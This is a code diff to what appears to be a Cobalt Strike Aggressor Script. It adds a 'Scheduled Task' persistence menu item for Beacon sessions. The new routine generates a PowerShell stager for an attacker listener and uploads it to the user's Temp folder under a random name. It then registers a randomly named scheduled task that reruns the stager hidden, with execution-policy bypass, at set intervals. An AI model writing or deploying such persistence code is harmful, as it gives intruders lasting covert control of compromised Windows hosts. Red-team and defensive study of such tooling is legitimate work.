@@ -8,6 +8,10 @@ popup beacon_bottom
             {
                 startup_folder($1);
             }
+            item "Scheduled Task"
+            {
+                scheduled_task($1);
+            }
             item "HKCU Autorun"
             {
                 hkcu_persistence($1);
@@ -33,6 +37,42 @@ sub startup_folder
         bupload_raw!($bid, "C:\\Users\\ $+ $username $+ \\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ $+ $filename $+ .bat", $cmd);
 
     }));
+}
+
+sub scheduled_task
+{
+    $bid = $1;
+
+    $dialog = dialog("Scheduled Task Persistence", %(int => "4", dur => "30"), lambda({
+
+        $int = $3['int'];
+        $dur = $3['dur'];
+        $listener = $3['listener'];
+
+        blog2($bid, "Tasked Beacon to install Scheduled Task Persistence using " . listener_describe($listener));
+
+        $username = binfo($bid[0], "user");
+        $artifact = artifact_stager($listener, "powershell", "x64");
+        $comp = powershell_compress($artifact);
+        $filename = get_random_filename();
+        $path = "C:\\Users\\ $+ $username $+ \\AppData\\Local\\Temp\\ $+ $filename $+ .ps1";
+
+        bupload_raw!($bid, $path, $comp);
+
+        $taskname = get_random_filename();
+        $trg = "\$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Hours  $+ $int $+ ) -RepetitionDuration (New-TimeSpan -Days  $+ $dur $+ )";
+        $act = "\$action = New-ScheduledTaskAction -Execute \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -Argument \"-Sta -Nop -Window Hidden -Exec Bypass -File  $+ $path $+  \" -WorkingDirectory \"C:\\Windows\\System32\"";
+        $reg = "Register-ScheduledTask -TaskName  $+ $taskname $+  -Trigger \$trigger -Action \$action -Force";
+
+        bpowershell!($bid, " $+ $trg $+ ;  $+ $act $+ ;  $+ $reg $+ ");
+
+    }));
+
+    drow_text($dialog, "int", "Interval (Hours)");
+    drow_text($dialog, "dur", "Duration (Days)");
+    drow_listener($dialog, "listener", "Listener: ");
+    dbutton_action($dialog, "Go");
+    dialog_show($dialog);
 }
 
 sub hkcu_persistence
